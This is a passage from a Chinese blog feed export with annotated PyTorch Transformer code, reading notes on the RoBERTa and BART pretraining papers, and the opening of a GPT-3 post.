<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PositionalEncoding</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, d_hid, n_position=<span class="number">200</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(PositionalEncoding, self).__init__()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Not a parameter</span></span><br><span class="line">        <span class="comment"># 成员变量无法保存在模型参数中且无法通过.cuda()转移到gpu上，register_buffer注册后则可以</span></span><br><span class="line">        self.register_buffer(<span class="string">'pos_table'</span>, self._get_sinusoid_encoding_table(n_position, d_hid))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_sinusoid_encoding_table</span>(<span class="params">self, n_position, d_hid</span>):</span></span><br><span class="line">        <span class="string">''' Sinusoid position encoding table '''</span></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> make it with torch instead of numpy</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">get_position_angle_vec</span>(<span class="params">position</span>):</span></span><br><span class="line">            <span class="keyword">return</span> [position / np.power(<span class="number">10000</span>, <span class="number">2</span> * (hid_j // <span class="number">2</span>) / d_hid) <span class="keyword">for</span> hid_j <span class="keyword">in</span> <span class="built_in">range</span>(d_hid)]</span><br><span class="line"></span><br><span class="line">        sinusoid_table = np.array([get_position_angle_vec(pos_i) <span class="keyword">for</span> pos_i <span class="keyword">in</span> <span class="built_in">range</span>(n_position)])</span><br><span class="line">        sinusoid_table[:, <span class="number">0</span>::<span class="number">2</span>] = np.sin(sinusoid_table[:, <span class="number">0</span>::<span class="number">2</span>])  <span class="comment"># dim 2i</span></span><br><span class="line">        sinusoid_table[:, <span class="number">1</span>::<span class="number">2</span>] = np.cos(sinusoid_table[:, <span class="number">1</span>::<span class="number">2</span>])  <span class="comment"># dim 2i+1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> torch.FloatTensor(sinusoid_table).unsqueeze(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> x + self.pos_table[:, :x.size(<span class="number">1</span>)].clone().detach()</span><br></pre></td></tr></tbody></table></figure>
<p>Transformer 编码器：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Encoder</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' A encoder model with self attention mechanism. '''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">            self, n_src_vocab, d_word_vec, n_layers, n_head, d_k, d_v,</span></span></span><br><span class="line"><span class="params"><span class="function">            d_model, d_inner, pad_idx, dropout=<span class="number">0.1</span>, n_position=<span class="number">200</span>, scale_emb=<span class="literal">False</span></span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.src_word_emb = nn.Embedding(n_src_vocab, d_word_vec, padding_idx=pad_idx) <span class="comment"># 词嵌入表</span></span><br><span class="line">        self.position_enc = PositionalEncoding(d_word_vec, n_position=n_position)</span><br><span class="line">        self.dropout = nn.Dropout(p=dropout)</span><br><span class="line">        self.layer_stack = nn.ModuleList([</span><br><span class="line">            EncoderLayer(d_model, d_inner, n_head, d_k, d_v, dropout=dropout) <span class="comment"># 编码网络</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n_layers)])</span><br><span class="line">        self.layer_norm = nn.LayerNorm(d_model, eps=<span class="number">1e-6</span>)</span><br><span class="line">        self.scale_emb = scale_emb</span><br><span class="line">        self.d_model = d_model</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, src_seq, src_mask, return_attns=<span class="literal">False</span></span>):</span></span><br><span class="line"></span><br><span class="line">        enc_slf_attn_list = []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- Forward</span></span><br><span class="line">        enc_output = self.src_word_emb(src_seq)</span><br><span class="line">        <span class="keyword">if</span> self.scale_emb:</span><br><span class="line">            enc_output *= self.d_model ** <span class="number">0.5</span></span><br><span class="line">        enc_output = self.dropout(self.position_enc(enc_output))</span><br><span class="line">        enc_output = self.layer_norm(enc_output)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> enc_layer <span class="keyword">in</span> self.layer_stack: <span class="comment"># 编码网络</span></span><br><span class="line">            enc_output, enc_slf_attn = enc_layer(enc_output, slf_attn_mask=src_mask)</span><br><span class="line">            enc_slf_attn_list += [enc_slf_attn] <span class="keyword">if</span> return_attns <span class="keyword">else</span> []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> return_attns:</span><br><span class="line">            <span class="keyword">return</span> enc_output, enc_slf_attn_list</span><br><span class="line">        <span class="keyword">return</span> enc_output,</span><br></pre></td></tr></tbody></table></figure>
<p>Transformer 解码器：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Decoder</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' A decoder model with self attention mechanism. '''</span></span><br><span class="line">	<span class="string">'''</span></span><br><span class="line"><span class="string">		与编码器类似</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">            self, n_trg_vocab, d_word_vec, n_layers, n_head, d_k, d_v,</span></span></span><br><span class="line"><span class="params"><span class="function">            d_model, d_inner, pad_idx, n_position=<span class="number">200</span>, dropout=<span class="number">0.1</span>, scale_emb=<span class="literal">False</span></span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.trg_word_emb = nn.Embedding(n_trg_vocab, d_word_vec, padding_idx=pad_idx)</span><br><span class="line">        self.position_enc = PositionalEncoding(d_word_vec, n_position=n_position)</span><br><span class="line">        self.dropout = nn.Dropout(p=dropout)</span><br><span class="line">        self.layer_stack = nn.ModuleList([</span><br><span class="line">            DecoderLayer(d_model, d_inner, n_head, d_k, d_v, dropout=dropout)</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n_layers)])</span><br><span class="line">        self.layer_norm = nn.LayerNorm(d_model, eps=<span class="number">1e-6</span>)</span><br><span class="line">        self.scale_emb = scale_emb</span><br><span class="line">        self.d_model = d_model</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, trg_seq, trg_mask, enc_output, src_mask, return_attns=<span class="literal">False</span></span>):</span></span><br><span class="line"></span><br><span class="line">        dec_slf_attn_list, dec_enc_attn_list = [], []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- Forward</span></span><br><span class="line">        dec_output = self.trg_word_emb(trg_seq)</span><br><span class="line">        <span class="keyword">if</span> self.scale_emb:</span><br><span class="line">            dec_output *= self.d_model ** <span class="number">0.5</span> <span class="comment"># Transformer论文中的trick，对词嵌入向量进行放大</span></span><br><span class="line">        dec_output = self.dropout(self.position_enc(dec_output))</span><br><span class="line">        dec_output = self.layer_norm(dec_output)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> dec_layer <span class="keyword">in</span> self.layer_stack:</span><br><span class="line">            dec_output, dec_slf_attn, dec_enc_attn = dec_layer(</span><br><span class="line">                dec_output, enc_output, slf_attn_mask=trg_mask, dec_enc_attn_mask=src_mask)</span><br><span class="line">            dec_slf_attn_list += [dec_slf_attn] <span class="keyword">if</span> return_attns <span class="keyword">else</span> []</span><br><span class="line">            dec_enc_attn_list += [dec_enc_attn] <span class="keyword">if</span> return_attns <span class="keyword">else</span> []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> return_attns:</span><br><span class="line">            <span class="keyword">return</span> dec_output, dec_slf_attn_list, dec_enc_attn_list</span><br><span class="line">        <span class="keyword">return</span> dec_output,</span><br></pre></td></tr></tbody></table></figure>
<p>Transformer：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Transformer</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' A sequence to sequence model with attention mechanism. '''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">            self, n_src_vocab, n_trg_vocab, src_pad_idx, trg_pad_idx,</span></span></span><br><span class="line"><span class="params"><span class="function">            d_word_vec=<span class="number">512</span>, d_model=<span class="number">512</span>, d_inner=<span class="number">2048</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            n_layers=<span class="number">6</span>, n_head=<span class="number">8</span>, d_k=<span class="number">64</span>, d_v=<span class="number">64</span>, dropout=<span class="number">0.1</span>, n_position=<span class="number">200</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            trg_emb_prj_weight_sharing=<span class="literal">True</span>, emb_src_trg_weight_sharing=<span class="literal">True</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            scale_emb_or_prj=<span class="string">'prj'</span></span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.src_pad_idx, self.trg_pad_idx = src_pad_idx, trg_pad_idx</span><br><span class="line"></span><br><span class="line">        <span class="comment"># In section 3.4 of paper "Attention Is All You Need", there is such detail:</span></span><br><span class="line">        <span class="comment"># "In our model, we share the same weight matrix between the two</span></span><br><span class="line">        <span class="comment"># embedding layers and the pre-softmax linear transformation...</span></span><br><span class="line">        <span class="comment"># In the embedding layers, we multiply those weights by \sqrt{d_model}".</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Options here:</span></span><br><span class="line">        <span class="comment">#   'emb': multiply \sqrt{d_model} to embedding output</span></span><br><span class="line">        <span class="comment">#   'prj': multiply (\sqrt{d_model} ^ -1) to linear projection output</span></span><br><span class="line">        <span class="comment">#   'none': no multiplication</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> scale_emb_or_prj <span class="keyword">in</span> [<span class="string">'emb'</span>, <span class="string">'prj'</span>, <span class="string">'none'</span>]</span><br><span class="line">        scale_emb = (scale_emb_or_prj == <span class="string">'emb'</span>) <span class="keyword">if</span> trg_emb_prj_weight_sharing <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">        self.scale_prj = (scale_emb_or_prj == <span class="string">'prj'</span>) <span class="keyword">if</span> trg_emb_prj_weight_sharing <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">        self.d_model = d_model</span><br><span class="line"></span><br><span class="line">        self.encoder = Encoder(</span><br><span class="line">            n_src_vocab=n_src_vocab, n_position=n_position,</span><br><span class="line">            d_word_vec=d_word_vec, d_model=d_model, d_inner=d_inner,</span><br><span class="line">            n_layers=n_layers, n_head=n_head, d_k=d_k, d_v=d_v,</span><br><span class="line">            pad_idx=src_pad_idx, dropout=dropout, scale_emb=scale_emb)</span><br><span class="line"></span><br><span class="line">        self.decoder = Decoder(</span><br><span class="line">            n_trg_vocab=n_trg_vocab, n_position=n_position,</span><br><span class="line">            d_word_vec=d_word_vec, d_model=d_model, d_inner=d_inner,</span><br><span class="line">            n_layers=n_layers, n_head=n_head, d_k=d_k, d_v=d_v,</span><br><span class="line">            pad_idx=trg_pad_idx, dropout=dropout, scale_emb=scale_emb)</span><br><span class="line"></span><br><span class="line">        self.trg_word_prj = nn.Linear(d_model, n_trg_vocab, bias=<span class="literal">False</span>) <span class="comment"># 投影到词表</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> self.parameters():</span><br><span class="line">            <span class="keyword">if</span> p.dim() &gt; <span class="number">1</span>:</span><br><span class="line">                nn.init.xavier_uniform_(p) <span class="comment"># xavier 初始化权重</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> d_model == d_word_vec, \</span><br><span class="line">        <span class="string">'To facilitate the residual connections, \</span></span><br><span class="line"><span class="string">         the dimensions of all module outputs shall be the same.'</span></span><br><span class="line">		<span class="comment"># 嵌入层与投影线性层权重共享</span></span><br><span class="line">        <span class="keyword">if</span> trg_emb_prj_weight_sharing:</span><br><span class="line">            <span class="comment"># Share the weight between target word embedding &amp; last dense layer</span></span><br><span class="line">            self.trg_word_prj.weight = self.decoder.trg_word_emb.weight</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> emb_src_trg_weight_sharing:</span><br><span class="line">            self.encoder.src_word_emb.weight = self.decoder.trg_word_emb.weight</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, src_seq, trg_seq</span>):</span></span><br><span class="line"></span><br><span class="line">        src_mask = get_pad_mask(src_seq, self.src_pad_idx)</span><br><span class="line">        trg_mask = get_pad_mask(trg_seq, self.trg_pad_idx) &amp; get_subsequent_mask(trg_seq)</span><br><span class="line"></span><br><span class="line">        enc_output, *_ = self.encoder(src_seq, src_mask)</span><br><span class="line">        dec_output, *_ = self.decoder(trg_seq, trg_mask, enc_output, src_mask)</span><br><span class="line">        seq_logit = self.trg_word_prj(dec_output)</span><br><span class="line">        <span class="keyword">if</span> self.scale_prj:</span><br><span class="line">            seq_logit *= self.d_model ** -<span class="number">0.5</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> seq_logit.view(-<span class="number">1</span>, seq_logit.size(<span class="number">2</span>))</span><br></pre></td></tr></tbody></table></figure>
<h3 id="optim.py">Optim.py</h3>
<p>一个简单封装的优化器类，用以动态调整学习率。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">'''A wrapper class for scheduled optimizer '''</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ScheduledOptim</span>():</span></span><br><span class="line">    <span class="string">'''A simple wrapper class for learning rate scheduling'''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, optimizer, lr_mul, d_model, n_warmup_steps</span>):</span></span><br><span class="line">        self._optimizer = optimizer</span><br><span class="line">        self.lr_mul = lr_mul</span><br><span class="line">        self.d_model = d_model</span><br><span class="line">        self.n_warmup_steps = n_warmup_steps</span><br><span class="line">        self.n_steps = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">step_and_update_lr</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">"Step with the inner optimizer"</span></span><br><span class="line">        self._update_learning_rate()</span><br><span class="line">        self._optimizer.step()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">zero_grad</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">"Zero out the gradients with the inner optimizer"</span></span><br><span class="line">        self._optimizer.zero_grad()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_lr_scale</span>(<span class="params">self</span>):</span></span><br><span class="line">        d_model = self.d_model</span><br><span class="line">        n_steps, n_warmup_steps = self.n_steps, self.n_warmup_steps</span><br><span class="line">        <span class="keyword">return</span> (d_model ** -<span class="number">0.5</span>) * <span class="built_in">min</span>(n_steps ** (-<span class="number">0.5</span>), n_steps * n_warmup_steps ** (-<span class="number">1.5</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_update_learning_rate</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">''' Learning rate scheduling per step '''</span></span><br><span class="line"></span><br><span class="line">        self.n_steps += <span class="number">1</span></span><br><span class="line">        lr = self.lr_mul * self._get_lr_scale()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> param_group <span class="keyword">in</span> self._optimizer.param_groups:</span><br><span class="line">            param_group[<span class="string">'lr'</span>] = lr</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="总结">总结</h2>
<p>读一遍代码发现了论文中忽视的好几个点，例如嵌入向量放缩、dropout 等，读代码还是很有必要的。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>Transformer</category>
      </categories>
      <tags>
        <tag>Transformer</tag>
        <tag>代码</tag>
      </tags>
  </entry>
  <entry>
    <title>RoBERTa</title>
    <url>/blog/2021/09/03/RoBERTa/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>RoBERTa 是华盛顿大学和 FaceBook 在论文《RoBERTa: A Robustly Optimized BERT Pretraining Approach》提出的预训练模型，论文似乎仅存在 arxiv 版本。RoBERTa 本质上是 BERT 的一个改进版本。论文发现 BERT 是未充分训练的，改进训练之后的 RoBERTa 在 GLUE、RACE、SQuAD 数据集上达到了 SOTA。代码和模型公开在了 <a href="https://github.com/pytorch/fairseq">github</a> 上。</p>
<span id="more"></span>
<p>相对于 BERT 的修改主要有以下方面：</p>
<ul>
<li>训练时间更长、数据更大（提出了一个新的数据集 CC-News）、batch 更大（有论文指出更大的 batch 模型训练结果越好）</li>
<li>移除下句预测预训练任务</li>
<li>训练序列更长</li>
<li>动态改变数据的 MASK，而 BERT 的 MASK 是固定的</li>
</ul>
<p>在不使用额外的训练数据的情况下，RoBERTa 在 GLUE 和 SQuAD 数据集上取得了优于 BERT 的性能。引入额外的训练数据后，RoBERTa 在 GLUE 中的四项任务、SQuAD、RACE 数据集上达到了 SOTA。</p>
<h2 id="实验">实验</h2>
<h3 id="数据集">数据集</h3>
<ul>
<li>GLUE（ General Language Understanding Evaluation，通用语言理解评估）：由 9 个句子或句子对的分类任务组成。</li>
<li>SQuAD（ Stanford Question Answering Dataset，斯坦福问答数据集）：抽取式问答任务。给出文档和问题，从文档中选择部分文本作为问题答案。</li>
<li>RACE（ ReAding Comprehension from Examinations，考试阅读理解数据集）：顾名思义，数据集来自考试题目，是一个分类任务。单个样本由文档、问题和若干个候选答案组成。正确答案不一定直接体现在文章中，需要深层理解文章并进行推断。</li>
</ul>
<h3 id="静态掩码vs动态掩码">静态掩码 vs 动态掩码</h3>
<p>论文将 RoBERTa 与参数量相近的<span class="math inline"> \(BERT_{BASE}\)</span> 进行了比较，结果如下所示。可以看出，动态掩码的效果与静态掩码持平或者略优于。个人猜测原因是动态掩码虽然能够使得模型模型接触到更多数据、更加鲁棒，但频繁的动态掩码会使得某些样本无法得到充足的训练。</p>
<p><img src="mask-result.png"></p>
<h3 id="下句预测">下句预测</h3>
<p>下句预测任务是 BERT 中提出的预训练任务，用于判断两句话是否构成连续上下句的关系。BERT 论文中认为下句预测任务是非常重要的，它提升了 QNLI、MNLI、SQuAD 数据集的性能。然而，一些工作开始质疑下句预测任务的有效性。RoBERTa 论文中比较了以下几种训练方法：</p>
<ul>
<li>句子段（连续多个句子）对 + 下句预测，也就是原版 BERT 的训练方法。</li>
<li>句子对 + 下句预测。</li>
<li>跨文档完整句子，将多篇文档拼接在一起，从中连续采样句子，可能跨文档也可能来自同一篇文档。</li>
<li>单文档句子，从单个文档中连续采样句子。</li>
</ul>
<p>实验结果如下：</p>
<p><img src="nsp.png"></p>
<p>前两种训练方法比较，前者优于后者，说明独立的句子会损害下流任务的性能。接下来比较有无 NSP 任务的训练方法，分析后可以看出，完整句子移除了 NSP 任务，与拥有 NSP 任务的性能基本持平，在某些任务上还略胜一筹。而单文档句子任务甚至优于跨文档完整句子。</p>
<h3 id="更大的batch">更大的 Batch</h3>
<p>机器翻译上的部分工作证实了大 batch-size 能够同时提高优化速度和任务性能，近期工作证实这同样适用于 BERT，论文在<span class="math inline"> \(BERT_{BASE}\)</span> 上进行了 Batch-size 的实验，结果如下：</p>
<p><img src="batch-size.png"></p>
<p>可以看出，2k 的 batch size 确实要优于 256，但 8k 却差于 2k。论文中也没有进行解释，迷惑。</p>
<h3 id="文本编码">文本编码</h3>
<p>字节对编码（Byte-Pair Encoding）是一种字词模型，BERT 使用它来构建词表。然而当语料规模很大时，unicode 字符会占据词表中相当大部分。2019 年 GPT2 论文指出，可以使用 unicode 字节而非 unicode 字符来作为基本字词单元，然而这种方法可能会有轻微的性能损失（毕竟破坏了字符的完整结构），但是由于其能减小词表规模，RoBERTa 还是基于此进行的词表构建。</p>
<h2 id="roberta">RoBERTa</h2>
<p>RoBERTa=BERT + 动态掩码 + 跨文档完整句子 + 更大 batch size + 字节编码 + 更大数据 + 更长训练时间</p>
<p>实验结果如下：</p>
<p><img src="roberta.png"></p>
<p>控制训练数据时，RoBERTa 已经优于<span class="math inline"> \(BERT_{LARGE}\)</span> 了（但在 SQuAD 上逊于 XLNET），在增加数据和训练更长时间后，三个数据集上全面超越 XLNET。</p>
<p>后面就是 GLUE、SQuAD 上各项指标的实验和比较了，基本 RoBERTa 也是最优的，这里就略去了。</p>
<h2 id="总结">总结</h2>
<p>RoBERTa 可以看作是 BERT 真正的完全体吧，弥补了原生 BERT 的缺陷。可能是因为创新性不足？没有被会议接受。看来预训练模型也还是很卷的。。。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
        <category>BERT</category>
      </categories>
      <tags>
        <tag>预训练模型</tag>
        <tag>BERT</tag>
        <tag>RoBERTa</tag>
      </tags>
  </entry>
  <entry>
    <title>BART</title>
    <url>/blog/2021/08/29/BART/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>BART 是 Facebook AI 于 2019 年发表的《Denoising Sequence-to-Sequence Pre-training for Natural Language Generation, Translation, and Comprehension》论文中提出的预训练模型，论文收录于 2020 年 ACL。顾名思义，BART 是一个基于 seq2seq 的预训练模型，可以用于自然语言生成、翻译、理解等任务。论文中的 “Denoising” 直译为降噪，实际上是模型的预训练目标。</p>
<span id="more"></span>
<p>一个水逆的周末，博客更新不能停！</p>
<h2 id="模型">模型</h2>
<p>预训练模型之前已经介绍过了，参考 <a href="https://tqnwhz.github.io/blog/2021/08/16/BERT/#more">BERT</a>。这里只做简单的介绍。预训练模型的目的是在大量数据上预训练一个能够解决通用任务的模型，下游任务可以在预训练模型的基础上进行调整适配，无需从头训练。预训练模型往往有几个关键因素：</p>
<ul>
<li>模型架构。Transformer 是公认的特征抽取能力很强的架构，因此常见的预训练模型都是用的 Transformer 架构。</li>
<li>预训练目标。在 BERT 之前，预训练模型往往都是按照标准的语言模型进行训练，例如 ELMO。BERT 第一次提出了掩码语言模型这样的预训练任务，不仅能够更好地适配下游任务，而且取得了更优的效果。如何能够挑选一个更好的预训练目标来建模通用任务，也是预训练模型的关键。</li>
<li>适用任务及使用方法。虽然预训练模型是为建模通用任务而存在的，然而还是存在适用任务的限制，具体任务对使用方法也有要求。</li>
<li>数据集。要求很简单，大而全。大就不用说了，数据集最好能够涵盖多个领域的数据，这样适配下游任务也会更简单。</li>
<li>效果。事实上没有个 state-of-the-art 都不太可能发出来，相对没有那么重要。</li>
</ul>
<p>按照这个顺序，我们来介绍一下 BART 模型。</p>
<h3 id="架构">架构</h3>
<p>基于 Transformer 的 seq2seq 模型，与 GPT 和 BERT 一样，使用的激活函数是 gelu 而不是 relu。与 BERT 的区别在于：</p>
<ul>
<li>有解码器、在解码器的每一层，添加了对编码器最后一层输出的注意力，跟 seq2seq 的注意力一致。</li>
<li>BART 去掉了在词预测之前的前馈神经网络。</li>
</ul>
<p>总结一下就是个 Transformer。与 BERT 的主要区别在于有解码器，可以用于生成任务，与 GPT 的主要区别在于有编码器，可以更好地用于监督的生成任务，如下图所示。</p>
<p><img src="architecture.png"></p>
<h3 id="预训练目标">预训练目标</h3>
<p>BART 的预训练目标定义为：给定文档，使用噪声函数（符号遮挡、符号删除、符号填充、文档排列、文档旋转）对文档施加噪声，再进行文档重构。换而言之，输入为有噪声的文档，期望输出为没有噪声的文档，这正是论文名中的 “降噪” 的由来。 在实验过程中，噪声可能是以上噪声函数的组合。几种噪声函数的示例分别如下：</p>
<p><img src="noises.png"></p>
<h3 id="适用任务">适用任务</h3>
<p>BART 可适用于以下任务：</p>
<ul>
<li>句子分类，输入输出均为该序列，将解码器的最终隐藏状态拿去分类即可，类似 BERT 中的 [CLS] token。</li>
<li>符号分类，输入输出均为该序列，将解码器每个位置的隐藏状态拿去分类即可。</li>
<li>序列生成，例如文本摘要、问答等任务，给定输入输出进行 fine-tune 即可。</li>
<li>目标语言为英语的机器翻译，这个任务其实也属于序列生成，不过有点不太一样。具体做法为，将 BART 的编码器随机初始化（就是丢弃本来的权重），然后冻结其他参数只更新编码器权重，后面再微调所有权重。这里限制为英语主要是 BART 本身在英文语料上训练的。</li>
</ul>
<h2 id="实验">实验</h2>
<h3 id="预训练目标比较">预训练目标比较</h3>
<p>为了评估各种预训练目标的有效性，BART 在尽量控制变量（分别调优，学习率、正则化可能有所差别）的前提下比较了如下几种预训练目标：</p>
<ul>
<li>语言模型，与 GPT 类似，从左向右的语言模型</li>
<li>置换语言模型，基于 XLNET，对 1/6 的符号进行采样，再进行自回归预测</li>
<li>掩码语言模型，与 BERT 类似</li>
<li>多任务掩码语言模型，与 uniLM 类似</li>
<li>掩码 seq2seq：掩码 50% 的序列，由 seq2seq 预测</li>
</ul>
<p>通过在问答、对话、摘要等多项任务上进行比较，论文得出以下结论：</p>
<ul>
<li>预训练目标的性能与下游任务有着很密切的关系，一个简单的语言模型可以在生成式问答上取得最优效果，在抽取式问答上效果确实最差的</li>
<li>符号遮挡是至关重要的，没有符号遮挡的文档旋转、句子重排的预训练目标表现较差</li>
<li>从左到右的语言模型预训练任务能改善生成任务，像掩码语言模型和置换语言模型不包含自回归语言模型训练任务，生成任务效果就会比较差</li>
<li>双向编码器对 SQuAD 数据集是非常重要的</li>
<li>预训练目标并非唯一重要的因素，任务性能也与模型结构等因素有很大关系</li>
<li>纯粹的语言模型在 ELI5 数据集上取得了最好的性能</li>
<li>使用文本填充预训练的 BART 取得了大部分数据集上的最优性能</li>
</ul>
<h3 id="大规模预训练">大规模预训练</h3>
<h4 id="判别任务">判别任务</h4>
<p>在两个数据集上进行实验：</p>
<ul>
<li>SQuAD（Stanford Question Answering Dataset，斯坦福问答数据集）：给定一篇文章和一个问题，从原文中选取部分文字作为问题的答案（答案一定原文中）。虽然是问答任务，但是并不是生成式的任务，而是判别式的任务。</li>
<li>GLUE（General Language Understanding Evaluation，通用语言理解评估）：由九个任务组成，每个任务都是句子或句子对的分类任务，例如 CoLA 对单句子是否符合文法进行评估，QQP 评估一对问题是否等价。</li>
</ul>
<p><img src="nlu.png"></p>
<p>两个数据集上的实验结果显示，BART 可以和 RoBERTa 打的有来有回。</p>
<h4 id="生成任务">生成任务</h4>
<p>分别在摘要生成、对话、问答生成、翻译多个任务上进行了实验，数据集分别介绍如下：</p>
<ul>
<li>CNN/DailyMail 和 XSum 是摘要生成的两个英文数据集。每个数据样本由文档与人工总结的摘要组成。与抽取式摘要任务不同，摘要中可以出现文档中未出现的单词或者句子。</li>
<li>CONVAI 是一个对话数据集，回复不仅取决于上下文，还取决于对话人的角色信息，换而言之，模型需要根据上下文和角色信息生成合适的回复。</li>
<li>ELI5 是一个生成式问答数据集，根据文档回答指定的问题。</li>
<li>WMT16 是一个翻译数据集，涵盖了多种语料到英语的翻译数据。</li>
</ul>
<p>在四项生成任务上的评估表明，BART 都取得了 SOTA 的性能。</p>
<h2 id="总结">总结</h2>
<p>BART 是一个基于 Transformer 架构的去噪 seq2seq 模型，通过破坏和重建原始文本进行预训练，在自然语言理解任务上与现有模型难分伯仲，但在自然语言生成任务上达到了 SOTA 的性能。</p>
<p>预训练模型简单分为三类：</p>
<ul>
<li>仅编码器，如 BERT，可以直接用于自然语言理解任务，或者加个解码器再用于生成任务。</li>
<li>仅解码器，如 GPT，可以直接用于自然语言生成任务，或者加个编码器可以用于条件生成任务。</li>
<li>编码器 + 解码器，如 BART，可以同时直接用于两种任务。</li>
</ul>
<p>后面可能会读一下 RoBERTa 的论文。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
        <category>BART</category>
      </categories>
      <tags>
        <tag>BART</tag>
        <tag>预训练模型</tag>
      </tags>
  </entry>
  <entry>
    <title>GPT 三部曲之三</title>
    <url>/blog/2021/08/18/GPT-3/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>GPT 系列是 OpenAI 推出的预训练模型，时至今日已经包含了三个模型，今天我来读的是 GPT 系列第三部，出自 2020 年发表在 NeurIPS 上的论文《Language Models are Few-Shot Learners》。秉着最新的成果往往更重要的原则，GPT 系列我打算倒着读。从名字可以看出，GPT-3 关注点在于少样本学习，虽然预训练模型在下游任务微调上取得了很好的成果，但是下游任务的微调往往也需要一定规模的数据集。GPT-3 希望能够用更大的模型（1750 亿）来将微调任务转变为少样本学习任务。</p>
<span id="more"></span>
<h3 id="预训练模型">预训练模型</h3>
